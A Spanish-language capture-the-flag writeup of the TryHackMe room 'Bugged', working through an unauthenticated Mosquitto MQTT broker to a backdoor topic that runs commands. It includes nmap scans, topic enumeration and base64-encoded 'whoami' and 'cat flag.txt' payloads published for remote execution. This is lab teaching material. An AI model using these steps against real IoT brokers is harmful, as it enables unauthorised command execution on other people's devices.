---
layout: single
title: THM - Bugged writeup
date: 2023-03-11
classes: wide
header:
  teaser: /assets/images/TryHackMe/logo.svg
  teaser_home_page: true
categories:
  - TryHackMe  
  - Easy
tags:
  - IoT
  - Whireshark
---

![](/assets/images/TryHackMe/Bugged/Bugged.png)

> Room: [https://tryhackme.com/room/bugged](https://tryhackme.com/room/bugged)

En este CTF vamos a estar abusando de una mala configuración del software **mosquitto**, que está destinado a la comunicación entre dispositivos IoT.

## índice
* [Nmap, Fuzzing y Reconocimiento](#nmap-fuzzing-y-reconocimiento)
* [Que es mosquitto?](#que-es-mosquitto)
* [Conectandonos a mosquitto](#sql-injection-boolean-based)
* [Analizando paquetes](#analizando-paquetes)
* [RCE](#rce)

## Nmap, Fuzzing y Reconocimiento

Como siempre, emepzamos con un descubrimiento de puertos port TCP.

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn -oG nmap/allPorts 10.10.244.194
```

```
# Nmap 7.93 scan initiated Sat Mar 11 17:52:31 2023 as: nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn -oG nmap/allPorts 10.10.244.194
# Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)
Host: 10.10.244.194 ()  Status: Up
Host: 10.10.244.194 ()  Ports: 1883/open/tcp//mqtt///   Ignored State: closed (65534)
# Nmap done at Sat Mar 11 17:52:43 2023 -- 1 IP address (1 host up) scanned in 12.74 seconds
```

Podemos ver que la máquina solo tiene 1 puerto abierto (1883/mqtt), para asegurarnos vamos a lanzar el siguiente comando.

```bash
nmap -p1883 -sVC -oN nmap/targeted 10.10.244.194
```

```
# Nmap 7.93 scan initiated Sat Mar 11 17:54:04 2023 as: nmap -p1883 -sVC -oN nmap/targeted 10.10.244.194
Nmap scan report for 10.10.244.194 (10.10.244.194)
Host is up (0.047s latency).

PORT     STATE SERVICE                  VERSION
1883/tcp open  mosquitto version 2.0.14
| mqtt-subscribe: 
|   Topics and their most recent payloads: 
|     $SYS/broker/subscriptions/count: 3
|     $SYS/broker/publish/bytes/sent: 390
|     kitchen/toaster: {"id":7571962640059079665,"in_use":false,"temperature":144.43929,"toast_time":321}
|     $SYS/broker/clients/active: 2
|     $SYS/broker/messages/received: 223
|     $SYS/broker/publish/messages/sent: 57
|     $SYS/broker/bytes/sent: 3356
|     $SYS/broker/bytes/received: 10507
|     $SYS/broker/clients/maximum: 2
|     $SYS/broker/load/publish/sent/1min: 26.50
|     $SYS/broker/load/bytes/received/1min: 3853.07
|     $SYS/broker/load/connections/1min: 1.93
|     $SYS/broker/clients/total: 2
|     $SYS/broker/load/messages/received/1min: 84.37
|     $SYS/broker/publish/bytes/received: 7423
|     $SYS/broker/load/bytes/received/15min: 645.65
|     $SYS/broker/store/messages/count: 34
|     $SYS/broker/uptime: 143 seconds
|     $SYS/broker/load/sockets/1min: 1.93
|     storage/thermostat: {"id":7861689936423236909,"temperature":23.638899}
|     livingroom/speaker: {"id":15674606775832435694,"gain":57}
|     patio/lights: {"id":515273552625597173,"color":"PURPLE","status":"OFF"}
|     frontdeck/camera: {"id":12816531778830348846,"yaxis":-30.181854,"xaxis":34.7052,"zoom":0.6693781,"movement":false}
|     $SYS/broker/version: mosquitto version 2.0.14
|     $SYS/broker/load/messages/received/15min: 13.73
|     $SYS/broker/retained messages/count: 36
|     $SYS/broker/store/messages/bytes: 267
|     $SYS/broker/load/bytes/sent/1min: 1454.10
|     $SYS/broker/messages/stored: 34
|     $SYS/broker/load/sockets/15min: 0.19
|     $SYS/broker/load/connections/5min: 0.52
|     $SYS/broker/load/connections/15min: 0.19
|     $SYS/broker/messages/sent: 279
|     $SYS/broker/load/publish/sent/5min: 5.69
|     $SYS/broker/clients/connected: 2
|     $SYS/broker/load/publish/sent/15min: 1.92
|     $SYS/broker/load/messages/sent/5min: 41.05
|     $SYS/broker/load/bytes/sent/15min: 135.94
|     $SYS/broker/load/messages/sent/15min: 15.65
|     $SYS/broker/load/messages/sent/1min: 110.87
|     $SYS/broker/load/messages/received/5min: 35.35
|     $SYS/broker/load/bytes/sent/5min: 381.52
|     $SYS/broker/load/sockets/5min: 0.52
|_    $SYS/broker/load/bytes/received/5min: 1656.40

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Mar 11 17:54:16 2023 -- 1 IP address (1 host up) scanned in 12.51 seconds
```

Para entender qué es este output, primero tenemos que entender qué es el software **mosquitto**.

## Que es mosquitto?

Mosquitto es un **broker MQTT** (Message Queuing Telemetry Transport) de código abierto que se utiliza para implementar la **comunicación de dispositivos IoT**. MQTT es un **protocolo de mensajería ligero** diseñado para facilitar la comunicación entre dispositivos IoT con ancho de banda limitado, alta latencia y requisitos de energía. Mosquitto implementa el protocolo MQTT y proporciona una plataforma de comunicación confiable y escalable para dispositivos IoT.<br>

Algunas de las aplicaciones de Mosquitto son:

* Monitoreo remoto
* Automatización del hogar
* Control de maquinaria industrial

Para entender más afondo cómo funciona este protocolo puedes visitar la página de [HackTricks](https://book.hacktricks.xyz/network-services-pentesting/1883-pentesting-mqtt-mosquitto).

## Conectandonos a mosquitto

Para conectarnos a este servicio podemos usar múltiples herramientas, pero yo voy a estar utilizando `python-mqtt-client-shell`.<br>
> Repositiorio de Github: [https://github.com/bapowell/python-mqtt-client-shell](https://github.com/bapowell/python-mqtt-client-shell)

Antes de empezar quiero aclarar tres conceptos que son de vital importancia para resolver este CTF.<br>

### MQTT - Subscribe

MQTT Subscribe es una operación fundamental en MQTT que permite a los clientes **recibir mensajes publicados** en temas específicos y proporciona una forma flexible de enviar y **recibir mensajes** en sistemas IoT y M2M.

### MQTT - Topics

Los MQTT Topics son aquellos **temas** a los que te puedes "suscribir".

### MQTT - Publish

MQTT Publish es una operación que se utiliza para **publicar un mensaje en un tema**. Al utilizar MQTT Publish, el cliente especifica el tema al que desea enviar el mensaje y proporciona el contenido del mensaje en formato de texto plano o binario. El servidor MQTT envía el mensaje a **todos los clientes** que estén **suscritos al tema** correspondiente.<br>

Para conectarnos al servicio tenemos que seguir esta serie de comandos:

```
$~ python3 mqtt_client_shell.py

> connection
> host $IP_MAQUINA
> connect
```

![](/assets/images/TryHackMe/Bugged/connection.png)

## Analizando paquetes

Lo que yo hice fue suscribirme a todos los temas/topics (`subscribe #`) para ver el tráfico con wireshark y exportarlo a un archivo .pcapng el cual analizaremos con detenimiento.

![](/assets/images/TryHackMe/Bugged/subscribe.png)

![](/assets/images/TryHackMe/Bugged/wireshark.png)

Nos interesa saber cuales son los temas/topics a los que nos podemos suscribir, podemos aplicar filtros al archivo exportado con wireshark para verlo.

```bash
tshark -r cap.pcapng -Y mqtt -T json -e mqtt.topic | jq '.[]._source.layers[]' | tr -d '\[\]' | sort -u
```

![](/assets/images/TryHackMe/Bugged/config.png)

## RCE

Salta a la vista el tema `.../config`, en el momento en el que nos suscribimos a este topic se nos empieza a llenar la pantalla de mensajes.<br>
Nos llegan dos payloads, uno en **base64** y otro en **hexadecimal**, los dos tienen el mismo contenido.

![](/assets/images/TryHackMe/Bugged/subscribe_config.png)

```bash
echo eyJpZCI6ImNkZDFiMWMwLTFjNDAtNGIwZi04ZTIyLTYxYjM1NzU0OGI3ZCIsInJlZ2lzdGVyZWRfY29tbWFuZHMiOlsiSEVMUCIsIkNNRCIsIlNZUyJdLCJwdWJfdG9waWMiOiJVNHZ5cU5sUXRmLzB2b3ptYVp5TFQvMTVIOVRGNkNIZy9wdWIiLCJzdWJfdG9waWMiOiJYRDJyZlI5QmV6L0dxTXBSU0VvYmgvVHZMUWVoTWcwRS9zdWIifQ== | base64 -d; echo

{"id":"cdd1b1c0-1c40-4b0f-8e22-61b357548b7d","registered_commands":["HELP","CMD","SYS"],"pub_topic":"U4vyqNlQtf/0vozmaZyLT/15H9TF6CHg/pub","sub_topic":"XD2rfR9Bez/GqMpRSEobh/TvLQehMg0E/sub"}
```

Antes de intentar enviar cualquier cosa a estos topics, tenemos que suscribirnos a estos por si nos llega algún mensaje.<br>
```
> subscribe U4vyqNlQtf/0vozmaZyLT/15H9TF6CHg/pub
> subscribe XD2rfR9Bez/GqMpRSEobh/TvLQehMg0E/sub
```
Ahora sí, al intentar hacer un `publish` al topic `XD2rfR9Bez/GqMpRSEobh/TvLQehMg0E/sub` con el contenido `hola` vemos el siguiente error.

![](/assets/images/TryHackMe/Bugged/publish_hola.png)

```bash
echo SW52YWxpZCBtZXNzYWdlIGZvcm1hdC4KRm9ybWF0OiBiYXNlNjQoeyJpZCI6ICI8YmFja2Rvb3IgaWQ+IiwgImNtZCI6ICI8Y29tbWFuZD4iLCAiYXJnIjogIjxhcmd1bWVudD4ifSk= | base64 -d; echo
Invalid message format.
Format: base64({"id": "<backdoor id>", "cmd": "<command>", "arg": "<argument>"})
```

Viendo el output llegamos a la conclusión que ya tenemos una via potencial de ejecutar comandos en la máquina, solo hay que enviar lo que queremos ejecutar con el formato correcto.

> id: cdd1b1c0-1c40-4b0f-8e22-61b357548b7d <br>
> cmd: CMD <br>
> arg: whoami <br>

```bash
echo '{"id":"cdd1b1c0-1c40-4b0f-8e22-61b357548b7d", "cmd":"CMD", "arg":"whoami"}' | base64 -w 0; echo
eyJpZCI6ImNkZDFiMWMwLTFjNDAtNGIwZi04ZTIyLTYxYjM1NzU0OGI3ZCIsICJjbWQiOiJDTUQiLCAiYXJnIjoid2hvYW1pIn0K
```

![](/assets/images/TryHackMe/Bugged/publish_whoami.png)

Cuando le hacemos un base64 decode al payload que hemos recibido vemos lo siguiente:

```bash
echo eyJpZCI6ImNkZDFiMWMwLTFjNDAtNGIwZi04ZTIyLTYxYjM1NzU0OGI3ZCIsInJlc3BvbnNlIjoiY2hhbGxlbmdlXG4ifQ== | base64 -d; echo
{"id":"cdd1b1c0-1c40-4b0f-8e22-61b357548b7d","response":"challenge\n"}
```

### Flag

```bash
$~ echo '{"id":"cdd1b1c0-1c40-4b0f-8e22-61b357548b7d", "cmd":"CMD", "arg":"cat flag.txt"}' | base64 -w 0; echo
eyJpZCI6ImNkZDFiMWMwLTFjNDAtNGIwZi04ZTIyLTYxYjM1NzU0OGI3ZCIsICJjbWQiOiJDTUQiLCAiYXJnIjoiY2F0IGZsYWcudHh0In0K

$~ echo eyJpZCI6ImNkZDFiMWMwLTFjNDAtNGIwZi04ZTIyLTYxYjM1NzU0OGI3ZCIsInJlc3BvbnNlIjoiZmxhZ3sxOGQ0NGZjMDcwN2FjOGRjOGJlNDViYjgzZGI1NDAxM31cbiJ9 |base64 -d
{"id":"cdd1b1c0-1c40-4b0f-8e22-61b357548b7d","response":"flag{XXX}\n"}
```